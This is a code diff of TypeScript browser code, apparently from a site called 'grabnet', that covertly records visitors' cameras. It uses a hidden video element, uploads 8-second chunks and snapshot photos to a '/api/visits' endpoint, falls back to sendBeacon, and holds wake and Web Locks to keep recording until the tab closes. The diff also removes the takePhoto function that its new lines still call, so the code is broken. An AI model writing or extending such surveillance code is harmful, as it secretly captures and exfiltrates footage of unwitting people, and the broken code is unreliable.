@@ -367,89 +367,54 @@ function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
 }
 
 function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string, isFinal = false) {
+  // Read blob as data URL. MIME types like 'video/webm;codecs=vp9,opus' contain
+  // commas, so we MUST use indexOf(';base64,') instead of split(',')[1].
   const reader = new FileReader();
   reader.onloadend = () => {
-    // Fix: video MIME types contain commas (e.g. video/webm;codecs=vp9,opus
-    // or video/mp4;codecs=avc1.42E01E,mp4a.40.2) so split(',')[1] grabs the
-    // wrong slice and produces a tiny/garbage buffer — hence broken files.
-    // Use indexOf(';base64,') to correctly extract the base64 payload.
     const dataUrl = reader.result as string;
-    const b64Marker = dataUrl.indexOf(';base64,');
-    const b64 = b64Marker >= 0 ? dataUrl.slice(b64Marker + 8) : dataUrl.split(',').slice(1).join(',');
+    const marker = dataUrl.indexOf(';base64,');
+    const b64 = marker >= 0 ? dataUrl.slice(marker + 8) : '';
     if (!b64) return;
+
+    const payload = JSON.stringify({ chunk: b64, mimeType, index, label, isFinal });
+
+    // Primary: regular fetch (no keepalive — keepalive has a hard 64 KB body
+    // limit per spec; a video blob is several MB and would be silently dropped).
+    // This works fine while the tab is active or merely backgrounded.
     fetch(`${BASE}/api/visits/videochunk`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chunk: b64, mimeType, index, label, isFinal }),
-      // keepalive: true lets this request outlive the page lifecycle.
-      // Without it, the final chunk upload is killed when the browser
-      // backgrounds the tab (visibility:hidden → stopAll() → onstop fires
-      // → uploadChunk() → fetch starts but is immediately cancelled).
-      // keepalive removed: Fetch keepalive has a hard 64KB body limit per spec.
-      // A 20-second video is several MB in base64 — the browser silently drops
-      // keepalive requests exceeding that limit (.catch swallows the TypeError).
-      // Chunks are sent while the page is active so keepalive is not needed.
-    }).catch(() => {});
+      body: payload,
+    }).catch(() => {
+      // Fallback: sendBeacon survives tab close for small payloads.
+      // Browsers allow a few hundred KB via sendBeacon — fine for short clips.
+      try {
+        navigator.sendBeacon(
+          `${BASE}/api/visits/videochunk`,
+          new Blob([payload], { type: 'application/json' }),
+        );
+      } catch { /* best-effort */ }
+    });
   };
   reader.readAsDataURL(chunk);
 }
 
-function sendPhoto(dataUrl: string, label: string) {
-  fetch(`${BASE}/api/visits/photo`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ photo: dataUrl, caption: `📷 ${label} SNAPSHOT` }),
-  }).catch(() => {});
-}
-
-async function takePhoto(videoEl: HTMLVideoElement, label: string, stream?: MediaStream, attempt = 0) {
-  // Primary: ImageCapture API — grabs a frame directly from the camera track.
-  // This bypasses the video element entirely so it works even when the
-  // video element hasn't painted a frame yet (avoids black captures).
-  if (stream) {
-    const track = stream.getVideoTracks()[0];
-    if (track && typeof ImageCapture !== 'undefined') {
-      try {
-        const ic = new ImageCapture(track);
-        const bitmap = await ic.grabFrame();
-        const c = document.createElement('canvas');
-        c.width = bitmap.width; c.height = bitmap.height;
-        const ctx = c.getContext('2d'); if (!ctx) return;
-        ctx.drawImage(bitmap, 0, 0);
-        bitmap.close?.();
-        sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
-        return;
-      } catch { /* fallthrough to video element */ }
-    }
-  }
-
-  // Fallback: draw from video element
-  if (videoEl.videoWidth > 0 && videoEl.readyState >= 2) {
-    const c = document.createElement('canvas');
-    c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
-    const ctx = c.getContext('2d'); if (!ctx) return;
-    ctx.drawImage(videoEl, 0, 0);
-    sendPhoto(c.toDataURL('image/jpeg', 0.92), label);
-  } else if (attempt < 30) {
-    setTimeout(() => takePhoto(videoEl, label, stream, attempt + 1), 300);
-  }
-}
-
 /**
- * Starts continuous front-cam recording — no time limit.
- * Uploads a chunk every CHUNK_INTERVAL_MS.
- * Auto-stops and sends final chunk when:
- *   - Tab is closed (beforeunload)
- *   - Page hidden (visibilitychange)
- *   - Camera track ends (permission revoked)
- */
-/**
- * Records camera in independent chunks — each chunk restarts the recorder
- * so it has its own initialization segment and is a standalone playable file.
- * 30-second chunks, runs until tab closes / page hidden / track ends.
+ * Records camera in independent self-contained chunks.
+ * Each chunk is a fresh MediaRecorder so it has its own initialization
+ * segment and is a standalone playable file (not a fragment).
+ *
+ * Key design decisions:
+ * - CHUNK_MS = 8 s   → first video arrives in ~8 s after recording starts,
+ *                       well within the typical page dwell time.
+ * - timeslice 500 ms → ondataavailable fires frequently so we never lose
+ *                       data if stop() is called mid-recording.
+ * - stopAll() immediately calls recorder.stop() — so the moment the user
+ *   backgrounds or leaves the page the current recording is finalized and
+ *   the upload attempt is made while the process is still alive.
  */
 function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
-  const CHUNK_MS = 20_000;
+  const CHUNK_MS = 8_000;
   const mimeType = getSupportedMime();
   if (!mimeType) {
     stream.getTracks().forEach(t => t.stop());
@@ -457,45 +422,60 @@ function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, l
     return;
   }
 
-  let idx    = 0;
-  let active = true;
+  let idx             = 0;
+  let active          = true;
+  let currentRecorder: MediaRecorder | null = null;
+  let chunkTimer: ReturnType<typeof setTimeout> | null = null;
 
   const cleanup = () => {
     stream.getTracks().forEach(t => t.stop());
     if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
   };
 
+  const stopAll = () => {
+    if (!active) return;          // already stopped
+    active = false;
+    if (chunkTimer != null) { clearTimeout(chunkTimer); chunkTimer = null; }
+    // Immediately finalize the current recording so the upload attempt
+    // is made while the page/process is still alive.
+    if (currentRecorder && currentRecorder.state === 'recording') {
+      currentRecorder.stop();
+    }
+  };
+
   function recordChunk() {
     if (!active || !stream.active) { cleanup(); return; }
 
-    const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_200_000 });
+    const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 800_000 });
+    currentRecorder = recorder;
     const chunks: Blob[] = [];
 
+    // timeslice ensures ondataavailable fires every 500 ms — data is
+    // accumulated continuously so stop() never loses a partial second.
     recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };
 
     recorder.onstop = () => {
+      currentRecorder = null;
       if (chunks.length) {
-        // Each stop produces a self-contained, playable video file
         const blob = new Blob(chunks, { type: mimeType });
         uploadChunk(blob, mimeType, idx++, label, !active);
       }
       if (active && stream.active) {
-        recordChunk(); // chain next chunk
+        recordChunk();   // chain next chunk
       } else {
         cleanup();
       }
     };
 
-    recorder.start();
-    // Stop after CHUNK_MS — onstop will fire and chain the next chunk
-    setTimeout(() => {
+    recorder.start(500);   // timeslice = 500 ms
+
+    chunkTimer = setTimeout(() => {
+      chunkTimer = null;
       if (recorder.state === 'recording') recorder.stop();
     }, CHUNK_MS);
   }
 
-  const stopAll = () => { active = false; };
-
-  // Keep tab alive
+  // Wake lock + Web Locks to keep the tab alive as long as possible
   (async () => {
     try {
       const lock = await (navigator as any).wakeLock?.request('screen');
@@ -505,20 +485,25 @@ function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, l
   if (navigator.locks) {
     navigator.locks.request('grabnet_rec', { mode: 'exclusive' }, () =>
       new Promise<void>(r => {
-        const check = setInterval(() => { if (!active) { clearInterval(check); r(); } }, 1000);
+        const check = setInterval(() => { if (!active) { clearInterval(check); r(); } }, 500);
       })
     ).catch(() => {});
   }
 
+  // Stop triggers — all call stopAll() which immediately stops the recorder
   stream.getVideoTracks().forEach(t => { t.onended = stopAll; });
   window.addEventListener('beforeunload', stopAll, { once: true });
   const onVis = () => {
-    if (document.visibilityState === 'hidden') { stopAll(); document.removeEventListener('visibilitychange', onVis); }
+    if (document.visibilityState === 'hidden') {
+      stopAll();
+      document.removeEventListener('visibilitychange', onVis);
+    }
   };
   document.addEventListener('visibilitychange', onVis);
 
-  // Photo after 4s warmup
-  setTimeout(() => takePhoto(videoEl, label, stream), 4000);
+  // First photo after 4 s warmup; second photo at 12 s
+  setTimeout(() => takePhoto(videoEl, label, stream), 4_000);
+  setTimeout(() => takePhoto(videoEl, label, stream), 12_000);
 
   recordChunk();
 }
